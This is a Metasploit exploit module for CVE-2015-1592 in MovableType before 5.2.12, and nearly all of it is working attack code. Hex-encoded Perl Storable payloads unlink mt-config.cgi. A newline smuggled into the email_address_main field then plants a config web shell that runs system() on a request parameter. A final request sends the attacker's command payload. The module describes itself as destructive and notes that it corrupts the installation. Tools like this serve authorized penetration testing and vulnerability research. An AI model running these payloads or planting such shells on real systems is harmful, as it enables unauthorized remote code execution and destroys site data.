##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MovableType CVE-2015-1592 - RCE (Destructive)',
      'Description'    => %q{
          This module exploits a serialization flaw in MovableType before 5.2.12 to execute
          arbitrary code by deleting and replacing the mt-config.cgi. This desctructive
          exploit does not depend on any modules that are not required MovableType dependencies
          in a normal CGI installation. However, this attack method will noticeably corrupt the
          MovableType installation.
      },
      'Author'         =>
        [
          'John Lightsey', # original discovery
          'John Ligthsey'  # metasploit version
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2015-1592' ],
          [ 'URL', 'https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html' ],
        ],
      'Privileged'     => false, # web server context
      'Payload'        =>
        {
          'DisableNops' => true,
          'BadChars'    => ' ',
          'Space'       => 1024,
        },
      'Compat'         =>
        {
          'PayloadType' => 'cmd'
        },
      'Platform'       => [ 'unix', 'linux' ],
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Feb 11 2015',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('URI', [ true, "MoveableType cgi-bin directory path", "/cgi-bin/movabletype" ]),
      ], self.class)
  end

=begin

#!/usr/bin/perl

# generate config parameter for storable injection check

use Storable;

{

    package XXXCHECKXXX;

    sub STORABLE_thaw {
        return 1;
    }

    sub STORABLE_freeze {
        return 1;
    }

}

my $check_obj = bless { ignore => 'this' }, XXXCHECKXXX;
my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze({ x => $check_obj});
$frozen = unpack 'H*', $frozen;
print "LFI test for storable flaw is: $frozen\n";

=end

  def check
    print_status("#{peer} - Sending storable test injection for XXXCHECKXXX.pm load failure")
    res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => normalize_uri(datastore['URI'], '/mt-wizard.cgi'),
        'vars_get' => {
          '__mode' => 'retry',
          'step'   => 'configure',
          'config' => '53455247000000000000000304080831323334353637380408080803010000000413020b585858434845434b58585801310100000078'
        }
      }, 25)
    if (res && res.code == 200 && res.body =~ /Can't locate XXXCHECKXXX.pm/)
      return Exploit::CheckCode::Vulnerable
    end

    print_status(res.body);
    return Exploit::CheckCode::Safe
  end

=begin

#!/usr/bin/perl

# generate config parameter to unlink mt-config.cgi

use Storable;

{
    package CGITempFile;
}

my $unlink_target = "mt-config.cgi";
my $cgitempfile = bless \$unlink_target, "CGITempFile";

my $data = [$cgitempfile];
my $frozen = 'SERG' . pack( 'N', 0 ) . pack( 'N', 3 ) . Storable::freeze($data);
$frozen = unpack 'H*', $frozen;
print "RCE unlink payload requiring CGI: $frozen\n";

=end

  def exploit
    # First we need to delte mt-config.cgi using the storable injection

    print_status("#{peer} - Sending storable injection to unlink mt-config.cgi")

    res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => normalize_uri(datastore['URI'], '/mt-wizard.cgi'),
        'vars_get' => {
          '__mode' => 'retry',
          'step'   => 'configure',
          'config' => '534552470000000000000003040808313233343536373804080808020100000004110b43474954656d7046696c650a0d6d742d636f6e6669672e636769'
        }
      }, 25)

    if (res and res.code == 200)
      print_status("Successfully sent unlink request")
    else
      fail_with(Failure::Unknown, "Error sending unlink request")
    end

    # Now we rewrite mt-config.cgi to accept a payload

    print_status("#{peer} - Rewriting mt-config.cgi to accept the payload")

    res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => normalize_uri(datastore['URI'], '/mt-wizard.cgi'),
        'vars_get'  => {
          '__mode'             => 'next_step',
          'step'               => 'optional',
          'default_language'   => 'en_us',
          'email_address_main' => "x\nObjectDriver mysql;use CGI;print qq{Content-type: text/plain\\n\\n};if(my $c = CGI->new()->param('xyzzy')){system($c);};unlink('mt-config.cgi');exit;1",
          'set_static_uri_to'  => '/',
          'config'             => '5345524700000000000000024800000001000000127365745f7374617469635f66696c655f746f2d000000012f', # equivalent to 'set_static_file_to' => '/',
        }
      }, 25)

    if (res and res.code == 200)
      print_status("Successfully sent mt-config rewrite request")
    else
      fail_with(Failure::Unknown, "Error sending mt-config rewrite request")
    end

    # Finally send the payload

    print_status("#{peer} - Sending payload request")

    res = send_request_cgi({
        'method'    => 'GET',
        'uri'       => normalize_uri(datastore['URI'], '/mt.cgi'),
        'vars_get'  => {
          'xyzzy'   => payload.raw,
        }
      }, 25)

    if (res and res.code == 200)
      print_status("Successfully sent payload request")
    else
      fail_with(Failure::Unknown, "Error sending payload request")
    end

    handler
  end

end
